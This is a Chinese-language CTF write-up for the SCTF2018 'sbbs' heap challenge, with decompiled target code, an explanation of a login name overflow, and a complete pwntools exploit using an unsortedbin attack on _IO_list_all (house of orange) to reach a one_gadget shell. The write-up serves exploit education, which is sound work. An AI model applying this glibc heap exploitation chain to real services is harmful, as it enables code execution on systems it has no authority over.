# SCTF2018 sbbs

## Author： Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>非常典型的利用unsortedbin attack攻击\_IO_FILE系统的题，也是一题house of orange，同样也十分适合用来练手。如果你会house of orange了的话，我们就直接来看这题吧：</font></br>

**main**

```c

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int choose; // eax

  setbufs();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();                                   // int sub_4009E2()
                                                // {
                                                //   puts("Online financial system");
                                                //   puts("1.Create Order");
                                                //   puts("2.Delete Order");
                                                //   puts("3.login");
                                                //   return puts("4.exit");
                                                // }
      choose = get_choose();
      if ( choose != 2 )
        break;
      delete();
    }
    if ( choose > 2 )
    {
      if ( choose == 3 )
      {
        login();
      }
      else
      {
        if ( choose == 4 )
          exit(0);
LABEL_12:
        puts("wrong choice");
      }
    }
    else
    {
      if ( choose != 1 )
        goto LABEL_12;
      create();
    }
  }
}
```



**create**

```c
int create()
{
  int result; // eax
  _BYTE *chunk; // [rsp+0h] [rbp-10h]
  signed int size; // [rsp+8h] [rbp-8h]
  signed int i; // [rsp+Ch] [rbp-4h]

  puts("Pls Input your note size");
  size = get_choose();
  if ( !(unsigned int)size_check(size) )        // a1 <= 0x176F && a1 > 0x96;
    return puts("error!");
  chunk = malloc(size);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !link[i] )
    {
      link[i] = (__int64)chunk;
      break;
    }
  }
  if ( i == 10 )
  {
    free(chunk);
    result = puts("failed! Order full");
  }
  else
  {
    puts("Input your note");
    safe_input(chunk, size);
    puts("your note is");
    puts(chunk);
    printf("order id is:%d\n", (unsigned int)i, chunk);
    result = puts("successed");
  }
  return result;
}
```



**delete**

```C
int delete()
{
  signed int index; // [rsp+Ch] [rbp-4h]

  puts("Input id:");
  index = get_choose();
  if ( index > 9 || index < 0 )
    return puts("failed! no order");
  if ( !link[index] )
    return puts("failed! no order");
  free((void *)link[index]);
  link[index] = 0LL;
  return puts("Delete order!");
}
```



**login**

```C
int sub_400A4A()
{
  __int64 v0; // rax
  int type; // eax
  __int64 v3; // [rsp+0h] [rbp-10h]
  __int64 *v4; // [rsp+8h] [rbp-8h]

  v4 = &name;
  if ( is_logined )
  {
    LODWORD(v0) = puts("you are already login");
  }
  else
  {
    is_logined = 1;
    puts("Please input your name");
    safe_input(&v3, 16);
    name = v3;
    puts("choice type");
    puts("0.clientele");
    puts("1.admin");
    type = get_choose();
    if ( type )
    {
      if ( type != 1 )
        exit(0);
      v0 = (__int64)(v4 + 1);
      *(_DWORD *)v0 = 0x696D6461;
      *(_WORD *)(v0 + 4) = 0x6E;
    }
    else
    {
      v0 = (__int64)(v4 + 1);
      *(_QWORD *)v0 = 0x6C65746E65696C63LL;
      *(_WORD *)(v0 + 8) = 0x65;
    }
  }
  return v0;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>唯一的漏洞点就是login中的name溢出导致存在任意地址写一个字符串，这一串字符串是不可能用来修改top chunk了因为无法绕过top chunk的页对齐检查，但我们可以用这个最后两个字节**扩大unsortedbin的大小**，这样就可以制造重叠堆块，有了重叠堆块就又可以利用unsortedbin attack写\_IO_list_all，还能修改unsortedbin的大小为0x61，攻击又可以实现了。那么首先利用UAF分配释放largebin（为什么是largebin？懒得解释了，看源码）来泄漏libc和堆基址：</font></br>



```python
from pwn import *

p=process('./sbbs')
elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')

_IO_list_all=elf.symbols['_IO_list_all']
#one_gadget=0x45216
#one_gadget=0x4526A
#one_gadget=0xf02a4
one_gadget=0xf1147

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='4.exit\n'

def add(size,content=''):
    sla(menu,'1')
    sla('Pls Input your note size\n',str(size))
    sla('Input your note\n',content)


def dele(index):
    sla(menu,'2')
    sla('Input id:\n',str(index))

def login(name):
    sla(menu,'3')
    sla('Please input your name\n',name)
    sla('1.admin\n','0')




add(0x1000)     # 0
add(0x100)      # 1
add(0x15f0)     # 2
dele(0)


add(0x400)
rv('your note is\n')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c5198
log.info('libc base is:'+hex(libc_base))

dele(0)
add(0x400,'a'*17)
rv('a'*16)
chunk_base=u64(p.recv(4)+4*'\x00')-0x61
log.info('chunk base is:'+hex(chunk_base))

dele(0)
dele(1)
dele(2)

# clear heap
##########################################

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>有了libc和堆的地址后，我们就可以开始尝试制造重叠堆块了，首先我们分配一系列堆块，我在这里释放了第二个堆块使之进入unsortedbin，然后因为unsortedbin是FIFO的特性，所以在login前先释放一个相应位置的chunk，写上align size用来绕过unsortedbin的size检查。如果不知道的话可以看我的how2pwn都有demo。</font></br>



```python
add(0x200)      # 0
add(0x100)      # 1

for i in range(6):
    add(0x15f0)  # 2->7

dele(6) # free first cause FIFO
dele(1)
login('a'*8+p64(chunk_base+0x211-8))

# write a size&0xfffffffffffffff8=0x6568 to bypass unsortedbin size check
add(0x15f0,'a'*0xc48+p64(0x6568)) # 1
dele(7)

add(0x200)  # 6


add(0x15f0,'a'*0x100)   # 7 overlap with 2
add(0x15f0,'a'*0x100)   # 8 overlap with 3
add(0x15f0,'a'*0x100)   # 9

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>然后我们释放index为3和8的堆块就得到了两个重叠的unsrotedbin，malloc地址低的一个，然后对其写入就可以覆写第二个unsortedbin的信息，我们修改其size为0x61，使其被加入smallbin的index6处，然后修改bk为\_IO_list_all，并在这个bin内伪造\_IO_FILE_plus结构，写_mode=0，写\_IO_write_ptr>\_IO_write_base（不懂的看hitcon2016的那题），最后分配一个堆块把这个unsortedbin加入smallbin就可以完成攻击了：</font></br>



```python
# 2 unsortedbin overlapped
dele(3)
dele(8)

# fake a _IO_FILE_plus structure
payload='b'*0xf8
payload+=p64(0x61)
payload+=p64(0)+p64(_IO_list_all+libc_base-0x10)
payload+=p64(0)+p64(1)
payload+=p64(0)*21+p64(chunk_base+0x1b00)
payload+=p64(0)*3+p64(one_gadget+libc_base)

#gdb.attach(p,gdbscript='b _IO_flush_all_lockp\nc')
add(0x15f0,payload)   # 3

sla(menu,'1')
sla('Pls Input your note size\n',str(0x16f0)) # pwned!
 

p.interactive()

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

```

